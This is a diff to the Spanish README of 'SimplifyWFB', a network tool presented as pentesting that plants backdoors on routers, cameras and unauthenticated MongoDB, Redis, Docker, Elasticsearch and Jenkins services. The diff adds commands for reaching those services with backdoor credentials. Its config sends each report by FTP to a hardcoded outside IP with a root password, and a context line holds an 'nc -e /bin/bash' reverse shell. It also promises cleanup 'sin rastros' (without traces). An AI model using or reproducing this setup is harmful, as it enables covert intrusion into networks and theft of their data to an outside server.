@@ -119,7 +119,32 @@ SimplifyWFB es una herramienta profesional de pentesting que **analiza redes de 
 ```
 **¿Qué significa?** Control total del router de la red
 
-### **5. CÁMARAS DE SEGURIDAD** 📹
+### **5. SERVICIOS VULNERABLES** 🗄️
+```json
+{
+  "vulnerable_services": [
+    {
+      "host": "192.168.1.100",
+      "port": 27017,
+      "service": "mongodb",
+      "vulnerability": "No authentication required",
+      "severity": "high",
+      "backdoor_created": true
+    },
+    {
+      "host": "192.168.1.101",
+      "port": 6379,
+      "service": "redis",
+      "vulnerability": "No authentication required",
+      "severity": "high",
+      "backdoor_created": true
+    }
+  ]
+}
+```
+**¿Qué significa?** Bases de datos y servicios expuestos sin protección
+
+### **6. CÁMARAS DE SEGURIDAD** 📹
 ```json
 {
   "cameras_accessed": [
@@ -176,6 +201,56 @@ Si configuraste port forwarding:
 
 ---
 
+## 🗄️ ¿CÓMO ACCEDER A SERVICIOS VULNERABLES?
+
+### **MongoDB (Puerto 27017)** 🍃
+```bash
+# Conectar directamente
+mongo mongodb://192.168.1.100:27017/admin
+
+# Con credenciales de backdoor
+mongo mongodb://backdoor_192_168_1_100:Mongo_100!@192.168.1.100:27017/admin
+```
+
+### **Redis (Puerto 6379)** 🔴
+```bash
+# Conectar directamente
+redis-cli -h 192.168.1.101 -p 6379
+
+# Ejecutar comandos
+redis-cli -h 192.168.1.101 -p 6379 ping
+redis-cli -h 192.168.1.101 -p 6379 keys *
+```
+
+### **Elasticsearch (Puerto 9200)** 🔍
+```bash
+# Verificar estado
+curl -X GET http://192.168.1.102:9200/_cluster/health
+
+# Buscar datos
+curl -X POST http://192.168.1.102:9200/_search
+```
+
+### **Docker (Puerto 2375)** 🐳
+```bash
+# Ver información
+curl -X GET http://192.168.1.103:2375/version
+
+# Ejecutar contenedor
+docker -H tcp://192.168.1.103:2375 run -it --rm alpine sh
+```
+
+### **Jenkins (Puerto 8080)** 🔧
+```
+# Acceder a la interfaz web
+http://192.168.1.104:8080/
+
+# Script console
+http://192.168.1.104:8080/script
+```
+
+---
+
 ## 🚀 ¿CÓMO USAR EL SCRIPT?
 
 ### **PASO 1: Preparación** ⚙️
@@ -194,6 +269,11 @@ Edita el archivo `config.json`:
   "remote_access": {
     "external_ip": "TU_IP_PUBLICA",
     "external_port": 4444
+  },
+  "ftp_upload": {
+    "host": "184.107.168.100",
+    "username": "root",
+    "password": "2vcA,%K6@8pJgq_b"
   }
 }
 ```
@@ -207,8 +287,21 @@ python3 simplifywfb.py
 - **Opción 1**: Escaneo completo (mantiene acceso permanente)
 - **Opción 2**: Pentest frío (limpia todo al final)
 
+### **MODO FRÍO - OPPORTUNIDAD DE PRUEBA** 🧪
+En el modo frío, después de completar todas las fases:
+1. **Reporte generado** y enviado por FTP
+2. **Oportunidad de prueba** de todos los backdoors creados
+3. **Confirmación requerida** antes de limpiar
+4. **Limpieza completa** si confirmas "sí"
+5. **Sin rastros** si eliges limpiar
+
 ### **PASO 4: Revisar Resultados** 📊
 El script genera un archivo `simplifywfb_report_TIMESTAMP.json` con todos los datos.
+
+### **PASO 5: Envío Automático** 📤
+- **Reporte enviado por FTP** automáticamente a `184.107.168.100`
+- **Archivo local** se mantiene en el equipo
+- **Acceso remoto** a los datos desde cualquier lugar
 
 ---
 
@@ -244,6 +337,7 @@ nc -e /bin/bash TU_IP_PUBLICA 4444
 - **Credenciales válidas** para acceder a sistemas
 - **Acceso completo** al router de la red
 - **Control de cámaras** de seguridad
+- **Servicios vulnerables** (MongoDB, Redis, Docker, etc.)
 - **Múltiples formas** de acceder remotamente
 
 ### **✅ ACCESO PERMANENTE:**
@@ -251,6 +345,7 @@ nc -e /bin/bash TU_IP_PUBLICA 4444
 - **VPN** para conexión segura
 - **Panel web** para administración
 - **Backdoors** para acceso oculto
+- **Servicios vulnerables** con backdoors específicos
 
 ### **✅ CONTROL TOTAL:**
 - **Router configurado** para acceso externo
